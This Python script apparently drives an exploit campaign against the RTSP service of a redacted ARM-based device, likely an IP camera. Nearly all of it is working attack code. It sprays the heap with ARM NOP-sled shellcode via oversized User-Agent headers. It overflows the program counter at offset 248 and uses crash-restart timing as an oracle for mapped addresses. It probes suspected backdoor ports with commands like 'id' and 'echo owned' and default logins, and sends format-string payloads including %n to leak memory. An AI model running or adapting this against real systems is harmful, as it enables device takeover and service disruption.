#!/usr/bin/env python3
"""
Phase 5-B: Address-space oracle scan + port banner probes.

Oracle: send RTSP overflow with PC = X, measure restart time:
  < 4s   → INVALID (SIGSEGV on unmapped page)
  > 60s  → KERNEL  (> 0xC0000000, causes full reboot)
  4-60s  → VALID / INTERESTING — possible mapped userspace page
  no restart in 15s → POSSIBLE EXECUTION (shellcode looping?)

For each address we first spray 64 × 4096-byte User-Agent requests
to fill heap with NOP+B. payload so shellcode is present if address lands there.
"""
import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

# ARM32 LE: NOP (mov r1,r1) × 128 then B . (infinite loop) — null-byte safe variant
# e1a01001 = MOV R1,R1 (NOP), eafffffe = B . (loop)
ARM_NOP  = b'\x01\x10\xa0\xe1'
ARM_LOOP = b'\xfe\xff\xff\xea'
SPRAY_PAYLOAD = ARM_NOP * 512 + ARM_LOOP  # 2048+4 = 2052 bytes

def wait_for_rtsp(timeout=90):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((TARGET, RTSP_PORT))
            d = b""
            try: d = s.recv(256)
            except: pass
            s.close()
            if d: return True
        except: pass
        time.sleep(0.4)
    return False

def heap_spray(n=64):
    """Flood heap with NOP+LOOP shellcode via large User-Agent."""
    for _ in range(n):
        try:
            req = (b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\n"
                   b"CSeq: 1\r\nUser-Agent: " + SPRAY_PAYLOAD * 2 + b"\r\n\r\n")
            s = socket.socket(); s.settimeout(4)
            s.connect((TARGET, RTSP_PORT))
            s.sendall(req)
            try: s.recv(256)
            except: pass
            s.close()
        except: pass

def probe_address(addr, oracle_timeout=15):
    """Returns (restart_seconds, tag)."""
    pc_bytes = struct.pack('<I', addr)
    payload  = b'A' * PC_OFFSET + pc_bytes + b'C' * 64
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req); s.close()
    except: pass
    t0 = time.time()
    deadline = t0 + oracle_timeout
    while time.time() < deadline:
        time.sleep(0.35)
        try:
            s2 = socket.socket(); s2.settimeout(2)
            s2.connect((TARGET, RTSP_PORT))
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if d:
                elapsed = time.time() - t0
                if elapsed < 4:   return elapsed, "FAST-invalid"
                elif elapsed < 60: return elapsed, "*** MEDIUM-HIT? ***"
                else:              return elapsed, "SLOW-kernel-reboot"
        except: pass
    return oracle_timeout, "NO-RESTART(executing?)"

# ─── addresses to scan ────────────────────────────────────────────────────────
ADDRS = [
    # ARM Linux kuser helpers — kernel maps these at 0xFFFF0xxx in EVERY process
    (0xFFFF0FE0, "kuser_get_tls"),
    (0xFFFF0FC0, "kuser_cmpxchg [loops!]"),
    (0xFFFF0FA0, "kuser_memory_barrier"),
    (0xFFFF0F60, "kuser_cmpxchg64"),
    # Stack: just below kernel boundary 0xC0000000
    (0xBFFF8000, "stack-0xBFFF8000"),
    (0xBFFF0000, "stack-0xBFFF0000"),
    (0xBFFE0000, "stack-0xBFFE0000"),
    (0xBFFC0000, "stack-0xBFFC0000"),
    (0xBFF80000, "stack-0xBFF80000"),
    (0xBFF00000, "stack-0xBFF00000"),
    (0xBFE00000, "stack-0xBFE00000"),
    # Process text (typical ARM ELF load addresses)
    (0x00008000, "text-0x8000"),
    (0x00010000, "text-0x10000"),
    (0x00020000, "text-0x20000"),
    (0x00040000, "text-0x40000"),
    (0x00080000, "text-0x80000"),
    (0x00100000, "text-0x100000"),
    (0x00200000, "text-0x200000"),
    (0x00400000, "text-0x400000"),
    (0x00800000, "text-0x800000"),
    # Shared libs / mmap region
    (0x40000000, "mmap-0x40000000"),
    (0x40100000, "mmap-0x40100000"),
    (0x40200000, "mmap-0x40200000"),
    (0x40400000, "mmap-0x40400000"),
    (0x40800000, "mmap-0x40800000"),
    (0x41000000, "mmap-0x41000000"),
    (0x42000000, "mmap-0x42000000"),
    (0x44000000, "mmap-0x44000000"),
    (0x48000000, "mmap-0x48000000"),
    (0x50000000, "mmap-0x50000000"),
]

print("=" * 60)
print("PART 1 — ADDRESS ORACLE SCAN")
print("  FAST(<4s)=invalid | MEDIUM(4-60s)=HIT? | NO-RESTART=executing?")
print("=" * 60)

hits = []
for addr, label in ADDRS:
    # Wait for RTSP to be alive first
    for attempt in range(3):
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((TARGET, RTSP_PORT)); s.close(); break
        except:
            time.sleep(1)

    # Spray heap before each probe (increases chance of shellcode being at addr)
    heap_spray(n=32)

    t, tag = probe_address(addr, oracle_timeout=15)
    print(f"  0x{addr:08X}  {label:35s}  {t:.1f}s  {tag}")
    if "HIT" in tag or "executing" in tag.lower():
        hits.append((addr, label, t, tag))
    time.sleep(0.3)

print()
print("=" * 60)
print("HITS SUMMARY:")
print("=" * 60)
if hits:
    for addr, label, t, tag in hits:
        print(f"  *** 0x{addr:08X}  {label}  {t:.1f}s  {tag}")
else:
    print("  (none — all addresses unmapped or kernel)")

# ─── Port banner probes ───────────────────────────────────────────────────────
print()
print("=" * 60)
print("PART 2 — PORT BANNER PROBES (distinguish NAT artefact vs real service)")
print("=" * 60)

PORT_PROBES = {
    23:   [b'\xff\xfb\x01\xff\xfb\x03\xff\xfd\x1f',  # telnet DO/WILL negotiation
           b'admin\r\n', b'root\r\n', b'\r\n'],
    4444: [b'id\n', b'whoami\n', b'echo owned\n',
           b'GET / HTTP/1.0\r\n\r\n', b'\r\n'],
    4242: [b'id\n', b'whoami\n', b'\r\n',
           b'GET / HTTP/1.0\r\n\r\n'],
    9999: [b'\r\n', b'GET / HTTP/1.0\r\n\r\n', b'id\n'],
    2323: [b'\xff\xfb\x01', b'admin\r\n', b'id\n', b'\r\n'],
    8000: [b'GET / HTTP/1.0\r\nHost: x\r\n\r\n'],
    8080: [b'GET / HTTP/1.0\r\nHost: x\r\n\r\n'],
}

for port, probes in PORT_PROBES.items():
    got_response = False
    for probe in probes:
        try:
            s = socket.socket(); s.settimeout(4)
            s.connect((TARGET, port))
            banner = b""
            try: s.settimeout(2); banner = s.recv(1024)
            except socket.timeout: pass
            s.sendall(probe)
            resp = b""
            try: s.settimeout(3); resp = s.recv(1024)
            except socket.timeout: pass
            s.close()
            if banner or resp:
                print(f"  port {port}: BANNER={repr(banner)[:80]} PROBE={repr(probe)[:20]} RESP={repr(resp)[:120]}")
                got_response = True
                break
            else:
                print(f"  port {port}: probe={repr(probe)[:20]} → no data (NAT artefact?)")
        except Exception as e:
            print(f"  port {port}: {e}")
            break
    if not got_response and port not in [8000, 8080]:
        print(f"  port {port}: all probes silent — NAT artefact confirmed")

# ─── Format string / info-leak probe on RTSP ─────────────────────────────────
print()
print("=" * 60)
print("PART 3 — RTSP INFO-LEAK PROBES (format strings + large reads)")
print("=" * 60)

LEAK_PAYLOADS = [
    b"%08x." * 16,
    b"%s%s%s%s",
    b"AAAA" + b"%08x." * 12,
    b"%.500s",
    b"%n",
    b"%x" * 32,
]

HEADERS = ["User-Agent", "Session", "Accept", "Require", "Transport", "Via"]

for hdr in HEADERS:
    for fmt in LEAK_PAYLOADS[:2]:
        try:
            s = socket.socket(); s.settimeout(5)
            s.connect((TARGET, RTSP_PORT))
            req = (b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\n"
                   b"CSeq: 1\r\n" + hdr.encode() + b": " + fmt + b"\r\n\r\n")
            s.sendall(req)
            resp = b""
            try: s.settimeout(3); resp = s.recv(2048)
            except: pass
            s.close()
            non_ascii = sum(1 for b in resp if b > 127 or (b < 32 and b not in (9,10,13)))
            looks_like_ptr = b"0x" in resp or b"0X" in resp
            if non_ascii > 3 or looks_like_ptr:
                print(f"  {hdr}: LEAK? non_ascii={non_ascii} resp={repr(resp)[:200]}")
            else:
                print(f"  {hdr}: clean, len={len(resp)}, non_ascii={non_ascii}")
        except Exception as e:
            print(f"  {hdr}: {e}")
        time.sleep(0.15)

print()
print("All done.")
